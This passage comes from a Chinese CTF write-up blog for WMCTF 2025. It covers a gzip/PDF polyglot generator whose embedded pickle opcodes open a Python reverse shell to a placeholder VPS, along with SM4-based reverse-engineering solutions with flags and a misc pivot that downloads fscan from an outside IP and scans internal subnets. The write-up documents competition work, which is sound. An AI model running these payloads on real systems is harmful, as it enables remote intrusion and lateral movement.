class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>生成恶意opcode, 这一步直接拷打ai迭代出来</p>
<p>genOpcode.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_minimal_pdf</span>(<span class="params">base_offset: <span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="comment"># Build a minimal valid PDF with absolute xref offsets accounting for base_offset</span></span><br><span class="line">    header = <span class="string">b&quot;%PDF-1.4\n%\xE2\xE3\xCF\xD3\n&quot;</span></span><br><span class="line"></span><br><span class="line">    obj1 = <span class="string">b&quot;&quot;&quot;1 0 obj</span></span><br><span class="line"><span class="string">&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;</span></span><br><span class="line"><span class="string">endobj</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&quot;\r&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    obj2 = <span class="string">b&quot;&quot;&quot;2 0 obj</span></span><br><span class="line"><span class="string">&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;</span></span><br><span class="line"><span class="string">endobj</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&quot;\r&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    obj3 = <span class="string">b&quot;&quot;&quot;3 0 obj</span></span><br><span class="line"><span class="string">&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R &gt;&gt;</span></span><br><span class="line"><span class="string">endobj</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&quot;\r&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    stream_body = <span class="string">b&quot;Hello WMCTF!&quot;</span>  <span class="comment"># small visible text</span></span><br><span class="line">    obj4 = (<span class="string">b&quot;4 0 obj\n&lt;&lt; /Length %d &gt;&gt;\nstream\n&quot;</span> % <span class="built_in">len</span>(stream_body)) + stream_body + <span class="string">b&quot;\nendstream\nendobj\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build PDF body and record absolute offsets</span></span><br><span class="line">    pdf = header</span><br><span class="line">    abs_offsets = []</span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> (obj1, obj2, obj3, obj4):</span><br><span class="line">        abs_offsets.append(base_offset + <span class="built_in">len</span>(pdf))</span><br><span class="line">        pdf += obj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># xref and trailer with absolute positions</span></span><br><span class="line">    xref_abs_offset = base_offset + <span class="built_in">len</span>(pdf)</span><br><span class="line">    xref_lines = [<span class="string">&quot;xref&quot;</span>, <span class="string">&quot;0 5&quot;</span>, <span class="string">&quot;0000000000 65535 f &quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> abs_offsets:</span><br><span class="line">        xref_lines.append(<span class="string">f&quot;<span class="subst">&#123;off:<span class="number">0</span>10d&#125;</span> 00000 n &quot;</span>)</span><br><span class="line">    xref = (<span class="string">&quot;\n&quot;</span>.join(xref_lines) + <span class="string">&quot;\n&quot;</span>).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"></span><br><span class="line">    trailer = (<span class="string">&quot;trailer\n&lt;&lt; /Size 5 /Root 1 0 R &gt;&gt;\nstartxref\n&quot;</span> + <span class="built_in">str</span>(xref_abs_offset) + <span class="string">&quot;\n%%EOF\n&quot;</span>).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pdf + xref + trailer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_gzip_with_extra</span>(<span class="params">extra_bytes: <span class="built_in">bytes</span>, payload_bytes: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="comment"># GZIP header with FEXTRA holding extra_bytes (uncompressed), then deflate-compressed payload, then CRC/ISIZE</span></span><br><span class="line">    ID1, ID2, CM = <span class="number">0x1F</span>, <span class="number">0x8B</span>, <span class="number">0x08</span></span><br><span class="line">    FLG = <span class="number">0x04</span>  <span class="comment"># FEXTRA</span></span><br><span class="line">    MTIME = <span class="number">0</span></span><br><span class="line">    XFL = <span class="number">0</span></span><br><span class="line">    OS = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(extra_bytes) &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;extra_bytes too long for GZIP FEXTRA (max 65535)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    header = <span class="built_in">bytes</span>([ID1, ID2, CM, FLG])</span><br><span class="line">    header += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, MTIME)</span><br><span class="line">    header += <span class="built_in">bytes</span>([XFL, OS])</span><br><span class="line">    header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="built_in">len</span>(extra_bytes))</span><br><span class="line">    header += extra_bytes</span><br><span class="line"></span><br><span class="line">    <span class="comment"># raw deflate for payload</span></span><br><span class="line">    comp = zlib.compressobj(level=<span class="number">9</span>, wbits=-<span class="number">15</span>)</span><br><span class="line">    comp_data = comp.compress(payload_bytes) + comp.flush()</span><br><span class="line"></span><br><span class="line">    crc = zlib.crc32(payload_bytes) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    isize = <span class="built_in">len</span>(payload_bytes) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    trailer = struct.pack(<span class="string">&#x27;&lt;II&#x27;</span>, crc, isize)</span><br><span class="line">    <span class="keyword">return</span> header + comp_data + trailer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># When storing PDF in GZIP FEXTRA, the PDF starts at byte offset 12 from file start</span></span><br><span class="line">    base_offset = <span class="number">12</span>  <span class="comment"># 10-byte gzip fixed header + 2-byte XLEN</span></span><br><span class="line">    pdf_bytes = build_minimal_pdf(base_offset=base_offset)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload to be recovered after decompression</span></span><br><span class="line">    opcode_bytes = <span class="string">b&#x27;&#x27;&#x27;(S&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;vps_ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)\&#x27;&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    gz_polyglot = build_gzip_with_extra(extra_bytes=pdf_bytes, payload_bytes=opcode_bytes)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;opcode.gz&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(gz_polyglot)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Diagnostics</span></span><br><span class="line">    idx = gz_polyglot.find(<span class="string">b&quot;%PDF-&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%PDF- found at offset:&quot;</span>, idx)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Total size:&quot;</span>, <span class="built_in">len</span>(gz_polyglot))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Quick local checks</span></span><br><span class="line">    <span class="comment"># 1) Decompress to verify opcode</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> gzip</span><br><span class="line">        data = gzip.decompress(gz_polyglot)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decompressed data:&quot;</span>, data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decompress failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) Basic header preview for PDF</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Header preview around %PDF-:&quot;</span>, gz_polyglot[idx:idx+<span class="number">20</span>] <span class="keyword">if</span> idx != -<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成 polyglot: 有效GZIP(可解压得到opcode) + 头部携带有效PDF(可通过PDF解析)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>首先上传包含恶意opcode的gz文件, vps监听, 再上传恶意pdf, 拿到shell</p>
<h1><span id="reverse">Reverse</span><a href="#reverse" class="header-anchor"></a></h1><h2><span id="catfriend">catfriend</span><a href="#catfriend" class="header-anchor"></a></h2><p>出题人失误了，搜索字符串直接找到flag</p>
<p><img src="../images/2025-WMCTF/3.png" alt="img"></p>
<p>WMCTF{5a3e8f2b-1c7d-4a6f-b89e-0d3c2f1a4b5c}</p>
<h2><span id="appfriend">appfriend</span><a href="#appfriend" class="header-anchor"></a></h2><p>Java层逻辑指向native层的check flag函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.yellow;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> androidx.constraintlayout.widget.ConstraintLayout;</span><br><span class="line"><span class="keyword">import</span> androidx.emoji2.text.d;</span><br><span class="line"><span class="keyword">import</span> b0.C0098a;</span><br><span class="line"><span class="keyword">import</span> b0.e;</span><br><span class="line"><span class="keyword">import</span> com.google.android.material.datepicker.k;</span><br><span class="line"><span class="keyword">import</span> e.AbstractActivityC0115h;</span><br><span class="line"><span class="keyword">import</span> e.C0114g;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AbstractActivityC0115h</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> EditText f1494x;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;yellow&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainActivity</span><span class="params">()</span> &#123;</span><br><span class="line">        ((e) <span class="built_in">this</span>.f818e.f832c).e(<span class="string">&quot;androidx:appcompat&quot;</span>, <span class="keyword">new</span> <span class="title class_">C0098a</span>(<span class="built_in">this</span>));</span><br><span class="line">        h(<span class="keyword">new</span> <span class="title class_">C0114g</span>(<span class="built_in">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">checkflag</span><span class="params">(String str)</span>;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// e.AbstractActivityC0115h, androidx.activity.k, x.f, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="type">View</span> <span class="variable">inflate</span> <span class="operator">=</span> getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> R.id.button;</span><br><span class="line">        <span class="keyword">if</span> (((Button) d.j(inflate, R.id.button)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((EditText) d.j(inflate, R.id.editText)) == <span class="literal">null</span>) &#123;</span><br><span class="line">                i2 = R.id.editText;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (((TextView) d.j(inflate, R.id.sample_text)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    setContentView((ConstraintLayout) inflate);</span><br><span class="line">                    <span class="built_in">this</span>.f1494x = (EditText) findViewById(R.id.editText);</span><br><span class="line">                    ((Button) findViewById(R.id.button)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">k</span>(<span class="number">2</span>, <span class="built_in">this</span>));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                i2 = R.id.sample_text;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Missing required view with ID: &quot;</span>.concat(inflate.getResources().getResourceName(i2)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>native层是标准的SM4加密</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __fastcall <span class="title">Java_com_example_yellow_MainActivity_checkflag</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s; <span class="comment">// x22</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// w24</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v7; <span class="comment">// x25</span></span><br><span class="line">  __int64 n_1; <span class="comment">// x26</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *s_1; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// w8</span></span><br><span class="line">  <span class="type">int</span> c; <span class="comment">// w1</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// w24</span></span><br><span class="line">  __int64 v13; <span class="comment">// x8</span></span><br><span class="line">  _BOOL4 v14; <span class="comment">// w24</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n47; <span class="comment">// x11</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n0x2E; <span class="comment">// x10</span></span><br><span class="line">  <span class="type">bool</span> v17; <span class="comment">// zf</span></span><br><span class="line">  __int64 dest_; <span class="comment">// [xsp+0h] [xbp-130h] BYREF</span></span><br><span class="line">  _DWORD v20[<span class="number">66</span>]; <span class="comment">// [xsp+8h] [xbp-128h] BYREF</span></span><br><span class="line">  __int128 v21; <span class="comment">// [xsp+110h] [xbp-20h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [xsp+120h] [xbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v22 = *(_QWORD *)(_ReadStatusReg(TPIDR_EL0) + <span class="number">40</span>);</span><br><span class="line">  s = (<span class="type">const</span> <span class="type">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="number">1352LL</span>))(a1, a3, <span class="number">0</span>);</span><br><span class="line">  n = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v21 = *(_OWORD *)&amp;byte_ADC;</span><br><span class="line">  v7 = (<span class="type">unsigned</span> __int8 *)&amp;v20[<span class="number">-2</span>] - (((<span class="type">unsigned</span> <span class="type">int</span>)(n + <span class="number">16</span>) + <span class="number">15LL</span>) &amp; <span class="number">0x1FFFFFFF0LL</span>);</span><br><span class="line">  n_1 = n;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest_, s, n);</span><br><span class="line">  s_1 = &amp;v7[n];</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">0</span> )</span><br><span class="line">    v10 = -(-n &amp; <span class="number">0xF</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v10 = n &amp; <span class="number">0xF</span>;</span><br><span class="line">  c = <span class="number">16</span> - v10;</span><br><span class="line">  v12 = <span class="number">16</span> - v10 + n;</span><br><span class="line">  v13 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( n_1 + <span class="number">1</span> &gt; v12 )</span><br><span class="line">    v13 = n_1 + <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s_1, c, v13 - n_1);</span><br><span class="line">  <span class="built_in">sm4_setkey_enc</span>(v20);</span><br><span class="line">  <span class="built_in">sm4_crypt_ecb</span>(v20, <span class="number">1</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v12, v7, v7);</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v7 == <span class="number">219</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    n47 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      n0x2E = n47;</span><br><span class="line">      <span class="keyword">if</span> ( n47 == <span class="number">47</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v17 = v7[n47 + <span class="number">1</span>] == byte_AEC[n47 + <span class="number">1</span>];</span><br><span class="line">      ++n47;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v17 );</span><br><span class="line">    v14 = n0x2E &gt; <span class="number">0x2E</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(<span class="built_in">void</span> (__fastcall **)(__int64, __int64, <span class="type">const</span> <span class="type">char</span> *))(*(_QWORD *)a1 + <span class="number">1360LL</span>))(a1, a3, s);</span><br><span class="line">  <span class="keyword">return</span> v14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>密文：DBE98E0AD47ED658741CD38EF85959858177D9F3A8F90F24CFE14FD11A313B72002A8A4EFA863CCAD024AC0300BB40D2</p>
<p>key：0123456789ABCDEFFEDCBA9876543210</p>
<p>找到密文和key注意端序赛博厨子直接解出flag</p>
<p><img src="../images/2025-WMCTF/4.png" alt="img"></p>
<p>WMCTF{sm4_1s_1imsss_test_easyss}</p>
<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="check-in">Check in</span><a href="#check-in" class="header-anchor"></a></h2><p>手速局，二血</p>
<h2><span id="questionnaire">Questionnaire</span><a href="#questionnaire" class="header-anchor"></a></h2><p>手速局，二血</p>
<h2><span id="shopping-company1">Shopping company1</span><a href="#shopping-company1" class="header-anchor"></a></h2><p><img src="../images/2025-WMCTF/5.png" alt="img"></p>
<p>直接vshell上线</p>
<h2><span id="shopping-company3">Shopping company3</span><a href="#shopping-company3" class="header-anchor"></a></h2><p>传个fscan上去，发现有两个网段</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://<span class="number">154.36</span><span class="number">.152</span><span class="number">.109</span>:<span class="number">9999</span>/fscan</span><br><span class="line"></span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p>对于172的网段进行扫描，结果如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@ff7bf03fb11e:/tmp<span class="comment"># ./fscan -h 172.20.0.20/24</span></span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [INFO] 暴力破解线程数: 1</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [INFO] 开始信息扫描</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [INFO] CIDR范围: 172.20.0.0-172.20.0.255</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [INFO] 生成IP范围: 172.20.0.0.%!d(string=172.20.0.255) - %!s(MISSING).%!d(MISSING)</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [INFO] 解析CIDR 172.20.0.20/24 -&gt; IP范围 172.20.0.0-172.20.0.255</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [INFO] 最终有效主机数量: 256</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [INFO] 开始主机扫描</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [SUCCESS] 目标 172.20.0.1      存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [SUCCESS] 目标 172.20.0.10     存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:54] [SUCCESS] 目标 172.20.0.20     存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:57] [INFO] 存活主机数量: 3</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:57] [INFO] 有效端口数量: 233</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:57] [SUCCESS] 端口开放 172.20.0.1:22</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:57] [SUCCESS] 端口开放 172.20.0.10:3000</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:57] [SUCCESS] 端口开放 172.20.0.1:3000</span></span><br><span class="line"><span class="string">[2025-09-20 13:27:57] [SUCCESS] 服务识别 172.20.0.1:22 =&gt; [ssh] 版本:9.2p1 Debian 2+deb12u7 产品:OpenSSH 系统:Linux 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7.]</span></span><br><span class="line"><span class="string">[2025-09-20 13:28:07] [SUCCESS] 服务识别 172.20.0.10:3000 =&gt; [http]</span></span><br><span class="line"><span class="string">[2025-09-20 13:28:07] [SUCCESS] 服务识别 172.20.0.1:3000 =&gt; [http]</span></span><br><span class="line"><span class="string">[2025-09-20 13:28:08] [INFO] 存活端口数量: 3</span></span><br><span class="line"><span class="string">[2025-09-20 13:28:08] [INFO] 开始漏洞扫描</span></span><br><span class="line"><span class="string">[2025-09-20 13:28:08] [INFO] 加载的插件: ssh, webpoc, webtitle</span></span><br><span class="line"><span class="string">[2025-09-20 13:28:08] [SUCCESS] 网站标题 http://172.20.0.10:3000   状态码:200 长度:7801   标题:智能商城 - 您的购物天堂</span></span><br><span class="line"><span class="string">[2025-09-20 13:28:08] [SUCCESS] 网站标题 http://172.20.0.1:3000    状态码:200 长度:7801   标题:智能商城 - 您的购物天堂</span></span><br><span class="line"><span class="string">[2025-09-20 13:28:10] [SUCCESS] 扫描已完成: 5/5</span></span><br></pre></td></tr></table></figure>

<p>没看到什么特殊的，扫描一下192的段</p>
